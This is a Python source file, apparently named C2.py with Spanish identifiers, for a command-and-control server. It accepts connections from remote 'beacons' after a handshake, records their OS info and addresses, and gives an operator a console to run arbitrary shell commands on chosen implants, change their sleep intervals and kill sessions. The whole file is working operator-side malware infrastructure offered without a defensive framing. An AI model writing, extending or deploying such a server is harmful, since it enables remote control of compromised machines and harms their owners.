import threading
import socket
import subprocess
import random
import time
from colorama import *
import sys

verde = Fore.GREEN
rojo = Fore.RED
rst = Fore.RESET
ipa = ""
interface = "wlo1"
puerto = 54312
comm = ""
ActualID = 0
Beacons = []
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cerrojo = threading.Lock()

class Beacon:
    def __init__(self,ID):
        self.ID = ID
    def SetOSInfo(self,OSINFO):
        self.OSINFO = OSINFO
    def SetIPAndPort(self,ip,port):
        self.ip = ip
        self.port = port
    def SetTimeSleep(self,time):
        self.SleepTime = time
    def SetSockInfo(self,cone,addr):
        self.cone=cone
        self.addr=addr
    def toString(self):
        print(self.OSINFO + 
              "IP:" + self.ip + "\n" + 
              "Puerto:" + self.port)
def Consola():
    global Beacons
    global comm
    global ActualID
    
    while True:    
        i =input(">>")
        if i.split(" ")[0] == "help":
            print("----BASIC COMMANDS---- \nrunon [Beacon ID] [Command] - Execute command on Beacon with ID\nrun [command] - Runs command on setted Beacon Id\nuse [Beacon ID] - Sets default beacon ID \nshow beacons - Show all avaible Beacons info\nsysinfo [Beacon ID] - Show a specific Beacon info\nsleep [Beacon ID] [time in seconds] - Change Beacon's sleep time\nkill [Beacon ID] - Kills connection with Beacon session")
        if i.split(" ")[0] == "run" : #Opcion run
            comm = " ".join(i.split(" ")[1:])
            print(comm)
            for Beacon in Beacons:
                if Beacon.ID == int(ActualID):
                    try:
                        Beacon.cone.send(comm.encode())
                    except:
                        print(f"Error al mandar comando a {Beacon.ID}")
        if i.split(" ")[0] == "runon": #Opcion runon
            ActualID = i.split(" ")[1]
            comm = " ".join(i.split(" ")[2:])
            print(comm)
            for Beacon in Beacons:
                if Beacon.ID == int(ActualID):
                    try:
                        Beacon.cone.send(comm.encode())
                    except:
                       print(f"Error al mandar comando a {Beacon.ID}")
        if i.split(" ")[0] == "sysinfo": # Opcion sysinfo
            for Beacon in Beacons:
                if Beacon.ID == int(i.split(" ")[1]):
                    Beacon.toString()
        if i.split(" ")[0] == "sleep": # Opcion sleep
            for Beacon in Beacons:
                if Beacon.ID == int(i.split(" ")[1]):
                    Beacon.SetTimeSleep(int(i.split(" ")[2]))    
                    timeslepp = int(i.split(" ")[2])
                    Beacon.cone.send(f"BeaconTimeSleepSet:{timeslepp}".encode())
        if i == "show beacons": # Opcion ShowBeacons
            for Beacon in Beacons:
                print("----------")
                Beacon.toString()
        if i.split(" ")[0] == "use":
            with cerrojo:
                print(int(i.split(" ")[1]))
                ActualID = int(i.split(" ")[1])
                print(f"{verde}Quick Beacon ID = {ActualID}{rst}")
        if i.split(" ")[0] == "kill":
            with cerrojo:
                for b in Beacons:
                    if b.ID == int(i.split(" ")[1]):
                        print(f"{rojo}El beacon {b.ID} ha sido eliminado con exito {rst}")
                        b.cone.send("BeaconKillConfirm".encode())
                        b.cone.close()
                        Beacons.remove(b)
def ComprobarID(ID):
    flag = False
    global Beacons
    for b in Beacons:
        if b.ID == ID:
            flag = True
    return flag
def Manejar(cone,addr):
    global Beacons
    global comm
    global ActualID
    ID = random.randint(100,999)
    if ComprobarID(ID) == True:
        while(ComprobarID(ID)!=False):
            ID = random.randint(1,1000)
    beacon = Beacon(ID)
    print(f"Nuevo beacon con id {ID}")
    cone.send("55 44 01".encode())
    datos = cone.recv(1024)
    #Set de atributos principales
    beacon.SetOSInfo(datos.decode() + "\n")
    beacon.SetIPAndPort(addr[0],str(addr[1]))
    beacon.SetTimeSleep(2)
    beacon.SetSockInfo(cone,addr)
    print(beacon.OSINFO)
    #Añadir Beacons a lista Beacons
    Beacons.append(beacon)
    print(f"{verde}Beacon {ID} añadido a la lista de beacons{rst}")
    try:
        while True:
            datos = cone.recv(1024)
            if datos:
                print(datos.decode())
    except KeyboardInterrupt:
        cone.close()
def IniciarC2():
    global s
    global ipa
    global puerto
    if not ipa: 
        c = subprocess.run(f"/bin/bash -c 'ip addres show {interface}'",shell=True,stdout=subprocess.PIPE,text=True)
        res = c.stdout.split(" ")
        ip = ""
        for i in range(len(res)):
            if res[i] == "inet":
                ip = res[i+1]
                print(ip)
        ipa = ip.split("/")[0]
    
    s.bind((ipa,puerto))
    print(f"Iniciando servidor en {ipa}:{puerto}")
    s.listen(25)
    inputUser = threading.Thread(target=Consola)
    inputUser.start()
    try:
        while True: 
            conn, addr = s.accept()
            if conn:
                if conn.recv(1024) == b"64 70 64":
                    hilo = threading.Thread(target=Manejar, args=(conn,addr))
                    hilo.start()
    except KeyboardInterrupt:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) == 3:
        ipa = sys.argv[1]
        puerto = int(sys.argv[2])
        IniciarC2()
    elif len(sys.argv) == 2:
        if sys.argv[1] == "default":
            print("Starting server on deafult interface eth0 port 54321")
        IniciarC2()
        if sys.argv[1] == "localhost":
            ipa = "127.0.0.1"
            IniciarC2()
            print("Starting server on localhost port 54321")
    else:
        print("Usage python3 C2.py [IP] [PORT]\nFor default coenction settings on wlo1 python3 C2.py default\nFor localhost server python3 C2.py localhost")
    